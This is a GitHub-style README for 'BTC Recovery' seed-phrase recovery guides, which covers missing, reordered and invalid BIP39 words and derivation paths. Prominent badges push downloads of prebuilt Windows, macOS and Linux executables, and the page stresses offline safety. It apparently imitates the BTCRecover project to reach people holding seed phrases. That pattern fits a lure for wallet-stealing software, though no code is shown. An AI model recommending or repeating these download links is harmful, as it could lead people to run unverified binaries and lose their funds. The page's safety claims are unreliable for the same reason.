<div align="center">
<img src="assets/banner-hub.png" alt="BTC Recovery seed phrase guides">
</div>

<h1 align="center">BTC Recovery seed phrase guides</h1>

<p align="center">Thirteen guides for phrases that are short, reordered, rejected or opening the wrong wallet.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

## What this repository is for

This repository holds the seed-phrase half of the BTC Recovery guides. Thirteen pages cover one situation each: a phrase with words missing, a phrase whose words are all present but in the wrong order, a phrase rejected as invalid, a phrase that a wallet accepts while opening an empty wallet, and the older phrases that do not follow the BIP39 format at all. They share a method. You establish what you actually have, you find one address that provably belongs to the wallet, and you test candidates against that address on your own machine until one matches. Nothing here asks you to send a phrase anywhere, and no page promises an outcome. What the pages do is make the search small enough to be worth running, and tell you which input to correct when a run finds nothing.

## Who it is for

- You wrote down some of the words and not all of them, and you know roughly how many are missing.
- You have all twelve or twenty-four words but not the order they were shown in.
- A wallet rejects your phrase with a checksum or invalid-word message.
- The phrase is accepted but the wallet it restores is empty, or the address is not the one you remember.

## Start here

- [btcrecover-seed-phrase-recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) is the entry point: it names the five states a phrase can be in and routes each one.
- [what-is-a-recovery-phrase-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/what-is-a-recovery-phrase-btcrecover.md) explains what a phrase is and what a recovery can and cannot do with it.
- [btcrecover-missing-seed-words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) handles the common case of one to three unknown positions.
- [btcrecover-empty-wallet-derivation-path](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) covers the phrase that is correct but opens the wrong address.

## How to use these guides

1. Count the words and write down the ones you are certain of before you open a terminal.
2. Find one address that belongs to the wallet: a receive address, a withdrawal record, a payment request.
3. Pick the guide that matches what you see, not the one that matches what you hope is wrong.
4. Run the smallest search that could succeed, then widen it only after a run comes back empty.
5. Confirm the result by restoring the phrase into a fresh wallet and matching the address from step two.
6. Stop between runs and note what changed, so a later attempt does not repeat a search that already came back empty.

## The guides, grouped

| Guide | What it answers |
| --- | --- |
| [How to recover a seed phrase](btcrecover-seed-phrase-recovery.md) | A seed phrase can be recovered when part of it still exists. |
| [How to recover a Bitcoin wallet with a seed phrase](recover-bitcoin-wallet-with-seed-phrase-btcrecover.md) | A seed phrase regenerates a wallet rather than unlocking a file, so a complete phrase restored into the right wallet type brings the keys back. |
| [Recover a seed phrase with 1-3 missing words](btcrecover-missing-seed-words.md) | BTCRecover fills the gaps, tests each candidate against an address that belongs to the wallet, and does it all offline on your own machine. |
| [Seed words in the wrong order](fix-seed-words-in-wrong-order-with-btcrecover.md) | BTCRecover searches the arrangements locally, checks each candidate against an address from the wallet, and stops when one produces it. |
| [Invalid recovery phrase: checksum and misspelled words](invalid-recovery-phrase-btcrecover.md) | BTCRecover finds the offending word locally by testing substitutions against the phrase's own checksum and then against an address from the wallet. |
| [Restored seed shows an empty wallet: derivation paths](btcrecover-empty-wallet-derivation-path.md) | A correct phrase that restores an empty wallet is almost never a lost wallet. |
| [BIP39 passphrase (25th word) recovery](btcrecover-bip39-passphrase-recovery.md) | A BIP39 passphrase is an optional extra string mixed into key derivation alongside the phrase; it is not a wallet password and it is not stored anywhere. |
| [How to find a lost Bitcoin wallet address](find-lost-bitcoin-wallet-address-btcrecover.md) | A Bitcoin address is not a wallet and cannot rebuild one, but it is the anchor that makes a partial recovery checkable. |
| [A recovery run that finds nothing: what to check](btcrecover-recovery-failed-what-now.md) | A finished run with no candidate is a result, not a verdict. |
| [You forgot which wallet software you used](forgot-which-wallet-software-btcrecover.md) | Identify the family first  -  recovery method, word list and derivation all follow from it. |
| [What a recovery phrase is, and what it is not](what-is-a-recovery-phrase-btcrecover.md) | A recovery phrase is a human-writable encoding of a wallet's master key: 12 to 24 words that regenerate every key and address the wallet ever used. |
| [Can lost Bitcoin be recovered?](can-lost-bitcoin-be-recovered-by-btcrecover.md) | It is not recoverable when nothing that generates or unlocks those keys survives, and no service, authority or tool changes that. |
| [Old wallets and Bitcoin from years ago](old-wallet-recovery-with-btcrecover.md) | Which one you have decides everything, and the search for it is archival before it is technical. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| Words missing from a phrase | [Recover a seed phrase with 1-3 missing words](btcrecover-missing-seed-words.md) | Each unknown position filled and tested until the address matches. |
| Words present in the wrong order | [Seed words in the wrong order](fix-seed-words-in-wrong-order-with-btcrecover.md) | The permutation that produces your address, found without rewriting the words. |
| A word the wallet will not accept | [Invalid recovery phrase: checksum and misspelled words](invalid-recovery-phrase-btcrecover.md) | The offending word identified against the BIP39 list before any long run. |
| A phrase that opens the wrong wallet | [Restored seed shows an empty wallet: derivation paths](btcrecover-empty-wallet-derivation-path.md) | The wallet type and path that match the address you know. |
| A 25th word you half remember | [BIP39 passphrase (25th word) recovery](btcrecover-bip39-passphrase-recovery.md) | Passphrase variants tested against the same phrase and address. |
| An older phrase that is not BIP39 | [You forgot which wallet software you used](forgot-which-wallet-software-btcrecover.md) | The wallet family whose phrase format fits what you have. |

## Common first questions

### How many missing words can this recover?

The guides cover one to three unknown positions, because each unknown multiplies the search by the size of the word list. The page on odds explains the arithmetic plainly.

### What if I have the words but not the order?

That is a different search over permutations, and it has its own guide. Twelve words out of order is a much smaller space than twelve unknown words.

### Why does my phrase open an empty wallet?

Usually a derivation path, a wallet type or a BIP39 passphrase, not a wrong phrase. The empty-wallet guide walks through those three in order.

### Do I need an address?

Yes. Without a known address there is nothing to check a candidate against, and the run has no way to stop on the right answer.

### Can I run this without giving anyone my phrase?

Yes, and that is the only acceptable way to do it. The search runs on your own machine against an address you supply, and no page here asks for the phrase itself.

## Before you install

Install the current release from the application repository before you start a seed-phrase search, and keep the phrase on paper rather than in a note on the same machine. A search is a long-running job that reads the word lists and the address you give it, so the machine should be one you control. If you are working on behalf of someone else, agree in advance which address proves the wallet, because that one fact decides whether any candidate is correct. Work from a backup of the wallet wherever a backup exists, and stop the run before you move funds, not after. A phrase search is cheap to start and expensive to leave running, so set the smallest rule set that could produce your address, watch the first candidates, and only then widen it.

## About

This repository is one of three guide repositories on the account, and it holds only the phrase cases so that a reader who has words and nothing else does not have to filter wallet-file pages out of the way. The application repository publishes the release these pages describe, the wallet-file repository covers encrypted containers and passwords, and the tool repository holds the command line, the safety checks and the index to everything. Every page here names the current release and points at it, because an older build prints different option names and the first fix for almost every situation on this page is to run the build that is published now. The order of the sections on every page follows the order of the decision a reader has to make, which is why the state table comes before the cause and the cause before the fix.

## License

This repository is released under the GPL-2.0 licence, and the full text is in [LICENSE](LICENSE).

---

**BTC Recovery** - offline Bitcoin wallet recovery for Windows, macOS and Linux.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
